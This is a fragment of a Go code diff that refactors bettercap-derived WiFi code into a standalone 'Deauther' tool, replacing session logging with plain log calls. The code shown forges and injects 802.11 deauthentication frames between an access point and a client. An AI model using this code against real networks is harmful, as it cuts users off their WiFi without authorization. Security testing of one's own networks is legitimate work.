@@ -15,7 +15,6 @@ import (
 
 	"github.com/bettercap/bettercap/network"
 	"github.com/bettercap/bettercap/packets"
-	"github.com/bettercap/bettercap/session"
 	"github.com/evilsocket/islazy/tui"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -26,6 +25,7 @@ type Deauther struct {
 	InterfaceName string
 	ApMac         string
 	ClientMac     string
+	SafeClients   []string
 }
 
 const (
@@ -54,7 +54,7 @@ type CaptureOptions struct {
 }
 
 type WiFiModule struct {
-	session.SessionModule
+	//session.SessionModule
 	iface  *network.Endpoint
 	Handle *pcap.Handle
 }
@@ -91,6 +91,7 @@ func NewWiFiModule(ifaceName string) (*WiFiModule, error) {
 		} else if !opts.Monitor {
 			// second fatal error, just bail
 			log.Printf("error while activating handle: %s\n", err)
+			return nil, err
 		} else {
 			// first fatal error, try again without setting the interface in monitor mode
 			log.Printf("error while activating handle: %s, %s\n", err, tui.Bold("interface might already be monitoring. retrying!"))
@@ -104,7 +105,7 @@ func NewWiFiModule(ifaceName string) (*WiFiModule, error) {
 func (mod *WiFiModule) injectPacket(data []byte) {
 
 	if err := mod.Handle.WritePacketData(data); err != nil {
-		mod.Error("could not inject WiFi packet: %s", err)
+		log.Printf("could not inject WiFi packet: %s\n", err)
 		//mod.Session.Queue.TrackError()
 	} else {
 		log.Println(uint64(len(data)))
@@ -119,14 +120,14 @@ func (mod *WiFiModule) SendDeauthPacket(ap net.HardwareAddr, client net.Hardware
 
 	for seq := uint16(0); seq < 64; seq++ {
 		if err, pkt := packets.NewDot11Deauth(ap, client, ap, seq); err != nil {
-			mod.Error("could not create deauth packet: %s", err)
+			log.Printf("could not create deauth packet: %s\n", err)
 			continue
 		} else {
 			mod.injectPacket(pkt)
 		}
 
 		if err, pkt := packets.NewDot11Deauth(client, ap, ap, seq); err != nil {
-			mod.Error("could not create deauth packet: %s", err)
+			log.Printf("could not create deauth packet: %s\n", err)
 			continue
 		} else {
 
